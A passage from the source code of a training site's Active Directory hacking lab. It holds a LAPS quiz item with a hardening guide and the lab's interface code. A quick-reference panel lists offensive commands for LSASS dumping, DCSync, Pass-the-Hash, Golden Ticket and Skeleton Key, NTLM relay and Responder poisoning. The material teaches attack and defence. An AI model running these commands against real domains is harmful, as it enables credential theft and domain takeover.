You are recommending the single most impactful quick-win control: a Microsoft solution that randomises each machine's local administrator password, stores it in AD, and rotates it on a schedule — eliminating the local admin hash reuse that enables mass lateral movement after a single workstation compromise. What is the name of this Microsoft solution?`,
    hint: 'The solution stands for Local Administrator Password Solution — it is abbreviated LAPS and is a free Microsoft tool.',
    answers: ['LAPS', 'laps', 'Local Administrator Password Solution', 'Microsoft LAPS'],
    xp: 20,
    explanation: `Active Directory hardening — comprehensive remediation guide:

IMMEDIATE ACTIONS (within 24 hours of a penetration test):

1. Rotate krbtgt password TWICE (with a delay between resets)
   — Invalidates all Golden Tickets and TGTs
   — Wait 10 hours between resets (to allow existing valid tickets to expire)
   — Document: this will require all users to re-authenticate

2. Identify and reset compromised account passwords
   — Focus on: service accounts with SPNs, any DA accounts that were cracked

3. Review DCSync rights
   — PowerShell: Get-DomainObjectAcl "DC=corp,DC=example,DC=com" -ResolveGUIDs | Where-Object {$_.ObjectAceType -match "DS-Replication"}
   — Remove any non-DC accounts with replication rights

DEPLOY: Local Administrator Password Solution (LAPS)
  Each machine gets a unique, auto-rotating local admin password (120+ char by default)
  Password stored in ms-Mcs-AdmPwd attribute in AD (or Windows LAPS uses new attribute)
  Rotated on a configurable schedule (default: 30 days)
  Eliminates the primary path for mass lateral movement via PtH
  Windows LAPS (built-in since Windows 2022/11 22H2) is the modern version — prefer it over legacy LAPS

Microsoft Tier Model — prevents credential exposure:
  Tier 0: DCs, ADFS, PKI, Azure AD Connect, Domain Admins
    — Only access from dedicated Tier 0 PAW machines
    — Tier 0 admins NEVER log into Tier 1 or Tier 2 machines
  Tier 1: Application servers, SQL, Exchange, file servers
    — Tier 1 admins use Tier 1 PAWs only
  Tier 2: Workstations, helpdesk
    — Standard corporate devices

Kerberos hardening:
  Enable Kerberos pre-authentication on ALL accounts (removes AS-REP Roasting)
  Migrate service accounts to Group Managed Service Accounts (gMSA)
    gMSA passwords are 240 chars, auto-rotated, managed by AD — uncrackable
  Remove SPNs from user accounts (use gMSA or computer accounts instead)
  Enable AES-only encryption for sensitive accounts (remove RC4 support)

NTLM hardening:
  Set NTLMMinClientSec and NTLMMinServerSec to require NTLMv2
  LmCompatibilityLevel = 5 (send NTLMv2 response only, refuse LM/NTLMv1)
  Disable LLMNR and NBT-NS domain-wide via GPO
  Consider blocking outbound NTLM to prevent relay attacks

Monitoring and detection capabilities to build:
  Microsoft Defender for Identity (MDI) — detects: Golden Ticket, DCSync, PtH, Kerberoasting, AS-REP Roasting, recon patterns
  Windows Event Forwarding to SIEM: 4624, 4625, 4648, 4662, 4663, 4672, 4768, 4769, 4771
  Alert on: DC replication from non-DC IPs (DCSync), mass 4768 requests (AS-REP Roasting), TGS with RC4 encryption (Kerberoasting)
  Run BloodHound quarterly as defenders — find ACL misconfigurations before attackers do
  Purple Team exercises: run all attacks from this lab against your own environment to validate detection`
  },

]

export default function ActiveDirectoryLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  const sections = [
    { num: '01-03', title: 'AD Architecture & Enumeration', color: accent },
    { num: '04-06', title: 'Kerberos Protocol Internals', color: accent },
    { num: '07-08', title: 'Credential Attacks (AS-REP & Kerberoast)', color: accent },
    { num: '09-10', title: 'BloodHound & Attack Path Analysis', color: accent },
    { num: '11-12', title: 'Lateral Movement (PtH, PtT, OPtH)', color: accent },
    { num: '13-15', title: 'Credential Dumping (LSASS, NTDS, DPAPI)', color: accent },
    { num: '16-18', title: 'Domain Dominance (DCSync, Golden Ticket, Persistence)', color: accent },
    { num: '19-22', title: 'ACL Abuse, Delegation & Defence', color: accent },
  ]

  useEffect(() => {
    const saved = localStorage.getItem('lab_active-directory-lab')
    if (saved) {
      const d = JSON.parse(saved)
      if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#7a2a1a' }}>
        <Link href="/" style={{ color: '#7a2a1a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/active-directory" style={{ color: '#7a2a1a', textDecoration: 'none' }}>ACTIVE DIRECTORY</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/active-directory" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #5a1a0a', borderRadius: '3px', color: '#7a2a1a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(255,65,54,0.04)', border: '1px solid rgba(255,65,54,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#5a1a0a', border: p.active ? '2px solid ' + accent : '1px solid #5a1a0a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#7a2a1a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#5a1a0a', margin: '0 2px' }}>&#8212;</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#8a4a3a' }}>
          MOD-{moduleNum} &nbsp;&#183;&nbsp; {moduleName.toUpperCase()} &nbsp;&#183;&nbsp; {xpTotal} XP AVAILABLE
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE &#8212; LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* PHASE 1 */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(255,65,54,0.1)', border: '1px solid rgba(255,65,54,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#7a2a1a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 &#8212; GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Active Directory Lab</h1>
          </div>
        </div>

        <p style={{ color: '#8a4a3a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          22 steps covering AD architecture, Kerberos protocol internals, AS-REP Roasting, Kerberoasting,
          BloodHound, lateral movement, credential dumping, domain dominance, ACL abuse, delegation attacks, and defence.
          Total {xpTotal} XP. Complete all steps to unlock Phase 2.
        </p>

        {/* Section index */}
        <div style={{ background: 'rgba(255,65,54,0.03)', border: '1px solid rgba(255,65,54,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#5a1a0a', letterSpacing: '0.25em', marginBottom: '10px' }}>LAB SECTIONS ({steps.length} STEPS &#183; {xpTotal} XP)</div>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(280px, 1fr))', gap: '6px' }}>
            {sections.map((s) => (
              <div key={s.num} style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '5px 8px', background: 'rgba(255,65,54,0.04)', borderRadius: '4px', border: '1px solid rgba(255,65,54,0.08)' }}>
                <span style={{ fontSize: '7px', color: s.color, fontWeight: 700, minWidth: '32px' }}>{s.num}</span>
                <span style={{ fontSize: '7.5px', color: '#8a4a3a' }}>{s.title}</span>
              </div>
            ))}
          </div>
        </div>

        <LabTerminal
          labId="active-directory-lab"
          moduleId={moduleId}
          title="Active Directory Lab"
          accent={accent}
          steps={steps}
          onComplete={(xp) => { setGuidedDone(true); setEarnedXp(xp) }}
          onRestart={() => { setGuidedDone(false); setFreeLaunched(false); setEarnedXp(0) }}
        />
      </div>

      {/* PHASE 2 */}
      <div id="free-lab" style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: guidedDone ? 'rgba(255,65,54,0.15)' : 'rgba(0,0,0,0.3)', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.4)' : '#5a1a0a'), display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: guidedDone ? accent : '#7a2a1a', fontWeight: 700 }}>2</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: guidedDone ? '#8a4a3a' : '#7a2a1a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 2 &#8212; FREE LAB ENVIRONMENT</div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.1rem', fontWeight: 700, color: guidedDone ? accent : '#7a2a1a' }}>Full Active Directory Practice Sandbox</div>
          </div>
          {guidedDone && !freeLaunched && (
            <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, background: 'rgba(255,65,54,0.08)', border: '1px solid rgba(255,65,54,0.2)', padding: '3px 10px', borderRadius: '3px' }}>
              GUIDED PHASE COMPLETE
            </div>
          )}
        </div>

        {!freeLaunched ? (
          <div style={{ background: guidedDone ? 'rgba(255,65,54,0.04)' : '#080604', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.25)' : '#2a0a08'), borderRadius: '10px', padding: '2.5rem', textAlign: 'center', position: 'relative', overflow: 'hidden' }}>
            {guidedDone && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: '2px', background: 'linear-gradient(90deg, transparent, ' + accent + ', transparent)' }} />}
            <div style={{ fontSize: '7px', color: guidedDone ? '#8a4a3a' : '#5a1a0a', letterSpacing: '0.3em', marginBottom: '1rem' }}>
              {guidedDone ? 'READY FOR COMPREHENSIVE TESTING' : 'COMPLETE GUIDED PHASE TO UNLOCK'}
            </div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.2rem', color: guidedDone ? accent : '#7a2a1a', fontWeight: 700, marginBottom: '0.5rem' }}>
              LAUNCH FULL LAB ENVIRONMENT
            </div>
            <div style={{ display: 'flex', gap: '12px', justifyContent: 'center', flexWrap: 'wrap', marginBottom: '2rem' }}>
              {['Kerberos internals', 'BloodHound paths', 'DCSync', 'Pass-the-Hash', 'Golden Tickets', 'NTLM relay', 'ACL abuse', 'Delegation'].map(feat => (
                <div key={feat} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
                  <div style={{ width: '4px', height: '4px', borderRadius: '50%', background: guidedDone ? accent : '#5a1a0a' }} />
                  <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: guidedDone ? '#8a4a3a' : '#5a1a0a' }}>{feat}</span>
                </div>
              ))}
            </div>
            <button
              onClick={() => guidedDone && setFreeLaunched(true)}
              disabled={!guidedDone}
              style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.9rem', fontWeight: 700, letterSpacing: '0.15em', padding: '14px 40px', border: '1px solid ' + (guidedDone ? 'rgba(255,65,54,0.6)' : '#5a1a0a'), borderRadius: '6px', background: guidedDone ? 'rgba(255,65,54,0.12)' : 'transparent', color: guidedDone ? accent : '#7a2a1a', cursor: guidedDone ? 'pointer' : 'not-allowed', boxShadow: guidedDone ? '0 0 24px rgba(255,65,54,0.18)' : 'none', transition: 'all 0.2s' }}
            >
              {guidedDone ? '&#9658; LAUNCH FREE LAB ENVIRONMENT' : '&#128274; COMPLETE GUIDED PHASE FIRST'}
            </button>
            {!guidedDone && <div style={{ marginTop: '1rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: '#5a1a0a' }}>Complete all {steps.length} guided steps above to unlock the free lab environment</div>}
          </div>
        ) : (
          <div style={{ border: '1px solid ' + accent + '30', borderRadius: '10px', overflow: 'hidden', background: '#080604' }}>
            <FreeLabTerminal moduleId={moduleId} moduleName={moduleName} accent={accent} onClose={() => setFreeLaunched(false)} />
            <div style={{ padding: '8px 16px', background: '#0a0806', borderTop: '1px solid ' + accent + '15', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <div style={{ width: '5px', height: '5px', borderRadius: '50%', background: accent, boxShadow: '0 0 5px ' + accent }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a2a1a' }}>
                You are in free practice mode. Ask <span style={{ color: accent }}>GHOST AGENT</span> (bottom-right) for hints on any Active Directory technique.
              </span>
            </div>
          </div>
        )}
      </div>

      {/* Quick reference */}
      <div style={{ marginBottom: '2rem' }}>
        <button onClick={() => setShowKeywords(!showKeywords)} style={{ background: 'transparent', border: '1px solid #5a1a0a', borderRadius: '5px', padding: '8px 16px', cursor: 'pointer', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#6a2a1a', letterSpacing: '0.1em', marginBottom: showKeywords ? '12px' : 0 }}>
          {showKeywords ? '&#9660;' : '&#9658;'} QUICK REFERENCE &#8212; ACTIVE DIRECTORY COMMANDS
        </button>
        {showKeywords && (
          <div style={{ background: '#080604', border: '1px solid #2a0a08', borderRadius: '6px', padding: '1.25rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem' }}>
            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(340px, 1fr))', gap: '8px' }}>
              {[
                ['enum4linux -a target_ip', 'SMB/RPC AD enumeration (null session)'],
                ['ldapsearch -x -H ldap://DC -b "DC=corp,DC=example,DC=com"', 'LDAP anonymous query'],
                ['setspn -T corp.example.com -Q */*', 'List all SPNs in domain'],
                ['impacket-GetNPUsers domain/ -usersfile users.txt', 'AS-REP Roasting (no creds)'],
                ['impacket-GetUserSPNs domain/user:pass -request', 'Kerberoasting'],
                ['hashcat -m 18200 asrep.hash rockyou.txt', 'Crack AS-REP hashes'],
                ['hashcat -m 13100 tgs.hash rockyou.txt', 'Crack Kerberoast hashes'],
                ['bloodhound-python -u user -p pass -d domain -c All', 'BloodHound collection'],
                ['impacket-psexec domain/admin@target -hashes :NTLM', 'Pass-the-Hash shell'],
                ['mimikatz sekurlsa::tickets /export', 'Export Kerberos tickets from memory'],
                ['impacket-getTGT domain/user -hashes :NTLM', 'Get TGT from NT hash'],
                ['mimikatz sekurlsa::logonpasswords', 'Dump LSASS credentials'],
                ['impacket-secretsdump domain/admin:pass@dc_ip -just-dc-ntlm', 'DCSync all hashes'],
                ['ntdsutil "ac i ntds" "ifm" "create full C:/Temp" q q', 'NTDS.dit backup (stealth)'],
                ['mimikatz kerberos::golden /user:fake /krbtgt:HASH /ptt', 'Golden Ticket forgery'],
                ['mimikatz misc::skeleton', 'Install Skeleton Key on DC'],
                ['Add-DomainObjectAcl -TargetIdentity "Domain Admins" -Rights All', 'WriteDACL to GenericAll'],
                ['impacket-findDelegation domain/user:pass', 'Find delegation configs'],
                ['impacket-getST domain/svc:pass -spn SPN -impersonate admin', 'S4U2Self/Proxy abuse'],
                ['impacket-ntlmrelayx -tf targets.txt -smb2support', 'NTLM relay attack'],
                ['responder -I eth0 -rdwv', 'LLMNR/NBT-NS poisoning'],
                ['crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt', 'Find SMB signing disabled hosts'],
              ].map(([cmd, desc]) => (
                <div key={cmd} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start', padding: '6px 8px', background: '#060402', borderRadius: '4px' }}>
                  <code style={{ color: accent, fontSize: '0.68rem', flexShrink: 0, whiteSpace: 'pre' }}>{cmd}</code>
                  <span style={{ color: '#8a4a3a', fontSize: '0.7rem' }}>{desc}</span>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      {/* Footer nav */}
      <div style={{ paddingTop: '2rem', borderTop: '1px solid #2a0a08', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '10px' }}>
        <Link href="/modules/active-directory" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a2a1a' }}>&#8592; BACK TO CONCEPT</Link>
        <Link href="/modules/web-attacks/lab" style={{ textDecoration: 'none', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.75rem', color: '#6a2a1a' }}>MOD-06 WEB ATTACKS LAB &#8594;</Link>
      </div>
    </div>
  )
}
